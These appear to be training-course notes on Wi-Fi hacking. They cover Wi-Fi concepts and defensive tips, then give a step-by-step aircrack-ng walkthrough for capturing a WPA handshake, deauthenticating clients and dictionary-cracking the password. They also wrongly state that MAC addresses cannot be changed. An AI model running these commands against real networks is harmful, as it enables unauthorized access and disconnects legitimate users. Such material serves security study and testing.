# 16 - Hacking Wireless

## Module 16 - Hacking Wireless Network

<details>

<summary>What is a Wireless Network?</summary>

A **wireless network** is a communication system that allows devices to connect and communicate with each other or access the internet without the need for physical wired connections. It relies on radio waves or other wireless signals to transmit data between devices, such as computers, smartphones, tablets, printers, and routers.

Wireless networks are commonly used in homes, businesses, and public spaces to provide convenient and flexible connectivity. They are often associated with technologies like **Wi-Fi**, which enables wireless access to the internet, and Bluetooth, which facilitates short-range connections between devices.

Subsequently, a router receives these radio signals and deciphers their content. It then proceeds to relay this information to the Internet either through a Local Area Network (LAN) or a wired Ethernet connection, such as a cable network connection.

Focusing on Wi-Fi we need to talk about this topics:

1. **Access Point (AP)**: is a device that allows wireless devices to connect to a wired network. It serves as the central hub for wireless communication, bridging the gap between wireless clients (like smartphones or laptops) and the wired local area network (LAN).
2. **MAC Address (Media Access Control Address)**: is a unique identifier assigned to network interfaces, such as Wi-Fi cards and Ethernet adapters. It is used to distinguish devices on a network and ensure that data is sent to the correct destination. MAC addresses are hardcoded into network hardware and cannot be changed.
3. **BSSID (Basic Service Set Identifier)**: is the MAC address of an individual wireless access point within a Wi-Fi network. It is used to differentiate between multiple access points that may be part of the same wireless network.
4. **ESSID (Extended Service Set Identifier)**: is the name of a Wi-Fi network. It is what you see when you scan for available Wi-Fi networks on your device. ESSIDs are used to identify and connect to specific wireless networks.
5. **Wi-Fi Channels**: are specific frequencies within the 2.4 GHz or 5 GHz radio bands that Wi-Fi networks use for communication. They are like virtual lanes on a highway, allowing multiple networks to operate without interference. Choosing the right channel can help optimize your Wi-Fi network's performance.
6. **Monitor Mode**: is a Wi-Fi card operation mode that allows it to passively listen to all traffic on a particular channel, without actively transmitting data. It's often used for network analysis, monitoring, and security purposes.
7. **Packet Injection**: is a technique that allows an attacker (or a security professional) to inject or transmit packets into a Wi-Fi network. This can be used for various purposes, including network testing, penetration testing, and security research. It can also be used maliciously to exploit vulnerabilities in wireless networks.

</details>

<details>

<summary>Wi-Fi Security</summary>

**Wi-Fi security** is essential to protect your wireless network from unauthorized access and potential security breaches. Here are some key aspects of Wi-Fi security:

1. **Encryption**: Enable strong encryption protocols, such as WPA3 (the latest and most secure standard) or WPA2, on your Wi-Fi network. Encryption ensures that the data transmitted between devices and the router is scrambled and can only be decrypted by devices with the correct encryption key.
2. **Unique and Strong Passwords**: Use strong, unique passwords for your Wi-Fi network. Avoid easily guessable passwords and consider using a passphrase that combines letters, numbers, and symbols. Change your Wi-Fi password regularly.
3. **Network Name (SSID)**: Change the default network name (SSID) of your router. A unique SSID makes it more difficult for unauthorized users to identify your network.
4. **Network Segmentation**: Separate your network into different segments, such as a guest network and a primary network. This helps isolate guest users from your primary devices.
5. **Guest Network**: If your router supports it, create a guest network for visitors. Guest networks have limited access to your primary network and can help protect your devices and data.
6. **Firmware Updates**: Keep your router's firmware up to date. Manufacturers release updates to patch security vulnerabilities. Regularly check for and install these updates.
7. **MAC Address Filtering**: Implement MAC address filtering to allow only specific devices to connect to your network. While this adds a layer of security, it can be cumbersome to manage.
8. **Disable WPS**: If your router supports Wi-Fi Protected Setup (WPS), consider disabling it. WPS can be vulnerable to brute-force attacks.
9. **Firewall**: Enable the router's built-in firewall to filter incoming and outgoing traffic. Configure it to allow only necessary services.
10. **Intrusion Detection and Prevention Systems (IDPS)**: Consider using IDPS software or appliances to monitor your network for suspicious activity and protect against intrusions.
11. **Virtual Private Network (VPN)**: Use a VPN to encrypt your internet connection, adding an extra layer of security when accessing the internet via your Wi-Fi network.
12. **Disable Remote Management**: Disable remote management of your router from the internet. This prevents unauthorized access to your router's settings.
13. **Physical Security**: Ensure physical security of your router. Place it in a secure location to prevent unauthorized physical access.
14. **Regularly Monitor Network Activity**: Regularly check the devices connected to your network and review the router's logs for any unusual activity.

</details>

## WEP/WPA/WPA2 Cracking using AIRCRACK-NG

**Aircrack-ng** is a complete suite of tools to assess WiFi network security. It focuses on different areas of WiFi security such as:

* **Monitoring**: Packet capture and export of data to text files for further processing by third party tools
* **Attacking**: Replay attacks, deauthentication, fake access points and others via packet injection
* **Testing**: Checking WiFi cards and driver capabilities (capture and injection)
* **Cracking**: WEP and WPA PSK (WPA 1 and 2).

#### Phases

1. **Capture the 4-Way Handshake with Airmon‐ng**
2. **Crack the handshake with Aircrack‐ng**
   * Brute Force
   * Dictionary

<details>

<summary>4-Way Handshake</summary>

Once you connect to a Wifi AP, You use a pre‐shared key that you enter into your mobile or laptop to connect to the Wifi access point. Once a device is connecting, it uses that password to generate a session key with the help of a process called four‐way handshake in which were parameters (not going into detail) are exchanged.

This new session key is then used for encrypted communication over Wifi.

If you capture this handshake, you can break it to reveal the password for the Wifi.

</details>

#### Phase 1 - Capture the Handshake

1. **Put your Wifi card in monitor mode** _(By default, the Wifi cards capture only that traffic which is intended for your device. By putting it in monitor mode, you are telling your Wifi card to capture all wireless traffic)._

* `iwconfig` -> Checks for existing Wifi adapterù
* `airmon‐ng start wlan0` -> Activate Monitor Mode
* iwconfig -> Check the device name

2. **Capture traffic with airodump‐ng** _(This tool captures all the traffic that your wireless adapter can see and displays information about it eg: BSSID (the MAC address of the AP), channel, speed, encryption (if any), ESSID or SSID._

* `airodump‐ng wlan0mon` -> Use your card name

3. **Now start capturing the related traffic of your target AP.**

* `airodump‐ng ‐c 6 ‐‐bssid C0:F6:C2:5E:8D:20 ‐w pass wlan0mon`

> _‐c 6 is the channel for the wireless network_&#x20;
>
> _‐‐bssid C0:F6:C2:5E:8D:20 is the access point MAC address. This eliminates extraneous traffic._
>
> _‐w pass is the file name_&#x20;
>
> _‐wlan0mon is the interface name._

* Now start capturing the related traffic of your target AP
* `airodump‐ng ‐c 6 ‐‐bssid C0:F6:C2:5E:8D:20 ‐w pass wlan0mon`

4. **Deauthenticate the Wireless clients.**

* `aireplay‐ng ‐0 100 ‐a C0:F6:C2:5E:8D:20 wlan0mon`

> ‐‐0 means deauthentication
>
> 100 is the number of deauth packets to send
>
> ‐a C0:F6:C2:5E:8D:20 is the access point MAC address
>
> ‐wlan0mon is the interface name.

5. **Look for the WPA Handshake in the Notification**

* Press CTRL + C , Once you have handshake

#### Phase 2 - Cracking password

6. **Now you can use the following command to break the password with Dictionary attack**

* aircrack‐ng ‐w /usr/share/wordlists/rockyou.txt ‐b C0:F6:C2:5E:8D:20 pass\*.cap

> ‐w rockyou.txt is the dictionary file. Kali has this inbuilt dictionary already installed
>
> Pass\*.cap is the packet file where a captured handshake is stored.

* Sometimes the password list is compressed and you may need to perform these steps to uncompress the file:`locate rockyou`
* Now uncompress the file: `gunzip /usr/share/wordlists/rockyou.txt.gz`                      `ls /usr/share/wordlists/`
* `aircrack‐ng pass*.cap ‐w /usr/share/wordlists/rockyou.txt`

**And well search/found password!!**

#### Best Alternate Wordlists Collections

* https://weakpass.com/&#x20;
* https://github.com/danielmiessler/SecLists/tree/master/Pass words/WiFi-WPA&#x20;
* https://labs.nettitude.com/blog/rocktastic/
* https://github.com/kennyn510/wpa2-wordlists

### WEP Cracking – AIRCRACK-NG

`aircrack-ng '/root/Desktop/Sample Captures/WEPcrack-01.cap'` ‘’ are not needed if there is no space in folder name

### WPA2 Cracking – AIRCRACK-NG

`aircrack-ng -a 2 -b 20:E5:2A:E4:38:00 -w /root/Desktop/Wordlists/Passwords.txt '/root/Desktop/Sample Captures/WPA2crack-01.cap'` -a 2 mode WPA2, -b bssid, -w wordlist

{% embed url="https://www.aircrack-ng.org/" %}

{% embed url="https://www.stationx.net/how-to-use-aircrack-ng-tutorial/" %}

WPA/WPA‐2 Cracking - AIRCRACK SUITE







